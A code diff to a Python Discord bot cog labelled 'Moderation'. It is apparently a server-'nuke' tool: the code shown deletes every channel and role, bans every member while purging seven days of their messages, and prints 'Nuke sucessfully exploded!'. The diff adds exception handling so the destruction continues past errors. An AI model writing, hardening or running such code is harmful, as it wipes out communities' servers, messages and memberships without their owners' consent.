@@ -43,7 +43,9 @@ class Moderation(commands.Cog):
                 await c.delete()
                 print(Fore.LIGHTBLUE_EX + f'Channel {c} deleted.')
             except discord.Forbidden:
-                print(Fore.RED + f'Failed to delete channel {c}.') 
+                print(Fore.RED + f'Failed to delete channel {c}.')
+            except discord.HTTPException:
+                print(Fore.RED + f'Failed to delete channel {c}.')
         print(Fore.LIGHTGREEN_EX + "Deleted all channels.\n")
 
         # Delete all roles.
@@ -72,6 +74,8 @@ class Moderation(commands.Cog):
                 await member.ban(reason=None, delete_message_days=7)
                 print(Fore.LIGHTBLUE_EX + f"Banned {member.display_name}.")
             except discord.Forbidden:
+                print(Fore.RED + f'Failed to ban {member}.')
+            except discord.HTTPException:
                 print(Fore.RED + f'Failed to ban {member}.')
         print(Fore.LIGHTGREEN_EX + "Banned all members.\n\n")
         print(Fore.LIGHTWHITE_EX + "Nuke sucessfully exploded!" + f"\n{'-'*35}\n\n")
